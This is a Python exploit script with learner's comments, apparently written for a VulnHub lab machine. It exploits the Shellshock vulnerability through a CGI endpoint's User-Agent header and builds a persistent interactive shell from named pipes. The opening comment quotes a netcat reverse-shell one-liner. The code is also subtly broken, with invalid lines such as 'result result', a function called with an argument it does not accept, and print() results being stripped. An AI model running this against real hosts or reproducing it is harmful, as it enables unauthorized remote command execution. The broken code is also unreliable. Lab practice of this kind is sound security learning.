
# this shell is based upon ---> rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ip port >/tmp/f
#It's just creating a named pipe to accept commands and piping commands into the named pipe and then doing output to a nc socket

#Instead in this code we're just gonna we are gonna output to a actual file and read the file and write to another file 
#see netcat-shell-explain Notes for more detail

#Also if we do echo "cd /root/Docs/vulnhub/socar" >> /tmp/input
#echo pwd > /tmp/input
#cat /tmp/output ( we see  /root/Docs/vulnhub/socar ) [-> which means we actually made a dir change and it's saved]


#so the vuln is in User-Agent parameter it's a cgi and the vuln is shell-shockk(mostly 9/10)

from IPython.core.debugger import Tracer; breakpoint = Tracer()
import requests
import time
from base64 import b64encode
from random import randrange

def RunCmd(cmd): #this func going to run cmd commands

    # if we have this encoded .encode('utf-8') we ca do b64encode then we can remove the encoding with .decode('utf-8') so it's just ascii text 
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')    # we have to decode it from utf when we pass to bash 
    #python3 makes us do everything in binary format [ if we remove .encode('utf-8') and .decode('utf-8') then error bytes-like object not string ]

    headers = {
        'User-Agent': '(){ ;; }; echo "Content-Type: text/html"; echo; export PATH=/home/devil/.local/bin:/usr/local/sbin:/usr/sbin:/bin; "%s" | base64 -d | sh ' % (cmd) 
    # all we are doing is echoing the base64 we send through the http req. decoding it and the sending over to sh to be executed.           
    }
    result = (print(requests.get('http://ip:port/cgi-bin/cat', headers=headers, timeout=5).text).strip())
    result result

def writeCmd(): #this funcs writes to stdin  meaning display the output of RunCmd() command to our terminal. 
     #same as abv just few things changed.
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')
    headers = {
        'User-Agent': '(){ ;; }; echo "Content-Type: text/html"; echo; export PATH=/home/devil/.local/bin:/usr/local/sbin:/usr/sbin:/bin; "%s" | base64 -d > %s' % (cmd, stdin) 
        #if here if we do stdout then we run hostname then we get hostname as it is.
    }
    result = (print(requests.get('http://ip:port/cgi-bin/cat', headers=headers, timeout=5).text).strip())
    result result

def ReadCmd():

    Getoutput = """ /bin/cat %s  """ % (stdout)
    output = RunCmd(Getoutput)
    return output

def SetupShell():

    NamedPipes = """ mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s """ % (stdin, stdin, stdout)
    try:    #this mkfifo never finishes so always use try 
        RunCmd(NamedPipes)
    except:
        None
    return None
global stdin, stdout    #(we could also do SetupShell(stdin, stdout)) #these gonna be static variables
session = randrange(1000,9999)  #returns a randomly selected integer from a specified range of values
                                #we did this bcoz at the end of this bcoz i assume we gonna run the script multiple times and unexpected error happens when the file already exists, so picking random  one 
                                #no repeats

stdin = '/dev/shm/input.%s' % (session) #/dev/shm/input.6751 random num
stdout = '/dev/shm/output.%s' % (session)
clearoutput = """echo '' > %s """ % (stdout) # we're geting  a bunch of history every time we run a command bcoz we're not clearing out the file each time.  

SetupShell()

while True:
    cmd = input("> ")
    writeCmd(cmd + "\n")

    #breakpoint() this sets the breakpoint and drops u into IPDB which is a interactive python debugger  which tells u where u at. So now u can do print(headers)
    #if u just do till here every single req is a new req. (we can't do pwd and cd.. to change dir)
    #print(requests.get('http://ip:port/cgi-bin/cat', headers=headers, timeout=5).text).strip()
    
    print(ReadCmd())
    RunCmd(clearoutput) # First read the command using print(ReadCmd()) then clear history 


